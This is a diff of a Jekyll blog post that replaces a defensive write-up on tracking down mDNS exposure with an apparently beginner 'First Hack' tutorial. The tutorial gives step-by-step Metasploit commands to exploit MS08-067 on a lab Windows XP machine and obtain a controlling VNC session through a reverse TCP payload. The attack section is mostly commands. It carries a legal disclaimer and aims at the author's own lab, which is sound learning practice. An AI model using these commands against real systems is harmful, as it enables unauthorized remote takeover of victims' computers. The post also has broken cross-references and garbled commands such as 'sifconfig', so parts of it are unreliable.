@@ -1,58 +1,128 @@
 ---
 layout: post
-title:  "Hunting for mDNS Vulnerabilities"
-date:   2018-04-18 14:56:03 -0400
+title:  "First Hack Part 2 (Searching for Targets and their Weaknesses)"
+date:   2018-04-16 14:56:03 -0400
 categories: jekyll update
 ---
 
-<b>Scanning with Nessus and Applying Proposed Solutions</b>
+<br>[Part 1 (Installing The Virtual Network)][part-1]
+<br>[Part 3 (Exploiting The Vulnurability)][part-2]
 
-I decided to run Nessus on my Windows 10 PC. This is my fastest PC. It is also my most valuable, so I want to ensure that the security is airtight (without going to extream measures). I loaded up Nessus in order to analyze the machine and the software identified 2 medium level vulnerabilities.
+Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise, you would be committing an illegal act.
 
-<br>[SMB Signing Disabled][SMB-Signing] https://www.tenable.com/plugins/nessus/57608
-<br>[mDNS Detection (Remote Network)][mDNS-Detection] https://www.tenable.com/plugins/nessus/12218
+<b>Roadmap</b>
 
-I followed the instructions in Nessus' SMB Signing article and blocked UDP port 5353 in Windows firewall. If you are not familliar with the firewall rule creation process, Microsoft wrote better instructions than I ever could have.
+Now comes the fun part. Using a tool called Metasploit in order to break into the Windows XP computer with a VNC. a VNC is simply a window that displays the target desktop. It allows you to control it the same way you are controlling your virtual machine. There are 4 simple steps to this.
 
-[Block Port With Windows 10 Firewall][port]
+Searching for the exploit command
 
-<b>Reaserching mDNS</b>
+Loading the exploit (Code to exploit the weakness)
 
-Ran the scan again and... the mDNS article did not vanish as expected. I went to Window's local group policy editor and ran the scan again. No difference. I started looking into what mDNS actually was. According to [RFC-6762][RFC-6762], mDNS (Multicast DNS) essentially makes it easier for devices to communicate over a network without the end user having to get too involved in the process. It's the reason why your iTunes can talk to other computer's iTunes so seamlessly. Although I own an iPhone, I don't really get too involved in the "Apple process," so I figured why not disable it. Thankfully iTunes itself uses something called Bonjour in order to utilize mDNS.
+Loading the payload (Software used to give you controll)
 
-<b>Locking Down Everything Apple</b>
+Set the Settings and "pwn the box"
 
-Thankfully Bonjour can just disable it on startup right? That was the theory in my head, but it didn't work. Although I can confirm Bonjour was no longer running via Task Manager. After looking into this, even more, it turns out Apple wasn't the only service that used this. I went as far as to uninstall Bonjour entirely and disable all apple related services on startup. Still no luck.
+<b>Searching for the Exploit Command</b>
 
-<b>Disable Link Local Multicast Name Resolution</b>
+The first thing we need to do is use the code identified in part 2. MS08_067 is the exploit we will use. But how do we load it? We need to get the command from the rapid7 database. Go to...
 
-Just for fun, I disabled the LLMNR entirely in the Group Policy editor.
+[https://www.rapid7.com/db][rapid7]
 
-Computer Configuration\Administrative Templates\Network\DNS Client\Turn off Multicast Name Resolution = Enabled
+Type "MS08_067" in the search field and make sure "Metasploit Moduel" is selected in the dropdown box.
 
-No luck. Worth a try.
+Look at the code under "Moduel Name." We will use that once we load metasploit
 
-<b>Using Nessus Deep Scan Data</b>
+<b>Loading the Exploit and Payload</b>
 
-At this point, the problem required a Nessus deep scan. The detailed reports weren't specific. In fact, it listed that mDNS was broadcasting from another port entirely. In fact, in the mess of numbers, one word stood out to me. The word "nvstream_dbd."
+[Offensive Security: Metasploit Commands][commands]
 
-<b>Poking at Nvidia drivers and services</b>
+[Offensive Security: Exploits][exploits]
 
-After tossing that term into Google, Forum users stated that nvStream was a process for Nvidia's "streaming" service. I remembered that I had ShadowPlay enabled because I sometimes record myself when I do 3D modeling. 
+[Offensive Security: Payloads][payloads]
 
-I simply disabled it and even blocked port 5353 as well as the other port on both TCP and UDP in the Windows firewall. Still no luck. At this point, things weren't making a whole lot of sense. I began re-installing the GeForce drivers in hopes that would resolve the issue. Unfortunately, it did not. Nvidia is a very respectable company and I figured that there had to be a solution to this problem that didn't involve me simply not using Nvidia products. Other than enabling Shadowplay, I don't use any of Nvidia's features.
+Open a terminal and load Metasploit's terminal interface with the following command
 
-After taking another trip to the Window's Add/Remove Programs menu, I revisited what Nvidia installed and what each package did. Nvidia 3D Vision sounded very essential. One of those things you "just don't touch." But it is always good practice for one to challenge their assumptions. After googling this, those drivers existed exclusively for a hardware produce Nvidia several years ago. It didn't occur to me because it did not get the same amount of spotlight 3D solutions like Occulus did.
+{% highlight ruby %}
+msfconsole
+{% endhighlight %}
 
-<b>Solution</b>
+Use the exploit we found in Rapid7 with the "use" command.
 
-Uninstall 3D Vision drivers and applications
+{% highlight ruby %}
+use exploit/windows/smb/ms08_067_netapi
+{% endhighlight %}
 
-Keep Bonjour disabled on startup
+There are many useful payloads. I will recomend we use a reverce TCP payload in order to gain a VNC session. Load the payload with the "set" command.
 
-Reverse all the changes mentioned in the article
+{% highlight ruby %}
+set PAYLOAD windows/vncinject/reverse_tcp
+{% endhighlight %}
 
-[SMB-Signing]: https://www.tenable.com/plugins/nessus/57608
-[mDNS-Detection]: https://www.tenable.com/plugins/nessus/12218
-[RFC-6762]: https://tools.ietf.org/html/rfc6762
-[port]: https://docs.microsoft.com/en-us/windows/security/identity-protection/windows-firewall/create-an-inbound-port-rule
+<b>Settings</b>
+
+We want to see if we have the correct settings. Use the following command.
+
+{% highlight ruby %}
+show options
+{% endhighlight %}
+
+You should get something that looks like this
+
+![image tooltip](/blog/images/ms08_067/msfconsole_show_options1.JPG)
+
+You may have noticed a few lines are missing. Specificly LHOST and RHOST. LHOST is the local host (your PC) and RHOST is the remote host (target PC)
+
+Lets fill those in with the set command
+
+{% highlight ruby %}
+set RHOST 192.168.1.244
+#I am using the ip of my own target computer. Use the IP for your own
+{% endhighlight %}
+
+Before we fill in LHOST, we need to the the IP of your own Linux machine.
+
+Press Ctrl+Shift+T in order to bring up a new terminal tab
+
+{% highlight ruby %}
+sifconfig
+{% endhighlight %}
+
+You should get something like this. I highlighted the IP in yellow. Your IP will be in the same spot but most likley different.
+
+![image tooltip](/blog/images/ms08_067/ifconfig.JPG)
+
+{% highlight ruby %}
+set LHOST 192.168.1.48
+#use the IP you just looked up in ifconfig
+{% endhighlight %}
+
+We filled in all the empty fields so we should be good right? Almost. By default, the VNC will only let you spy on the target machine. We want to enable control. Make one more setting.
+
+{% highlight ruby %}
+set ViewOnly false
+{% endhighlight %}
+
+Run the show options again and make sure you have these settings.
+
+![image tooltip](/blog/images/ms08_067/msfconsole_show_options2.JPG)
+
+<b>Hack It!</b>
+
+Finally, run the command
+
+{% highlight ruby %}
+exploit
+{% endhighlight %}
+
+Congradulations, you did it!!
+
+![image tooltip](/blog/images/ms08_067/owned.JPG)
+
+
+
+[part-1]: MS08_067_Part_1.html
+[part-2]: MS08_067_Part_2.html
+[rapid7]: https://www.rapid7.com/db
+[commands]: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
+[exploits]: https://www.offensive-security.com/metasploit-unleashed/exploits/
+[payloads]: https://www.offensive-security.com/metasploit-unleashed/payloads/
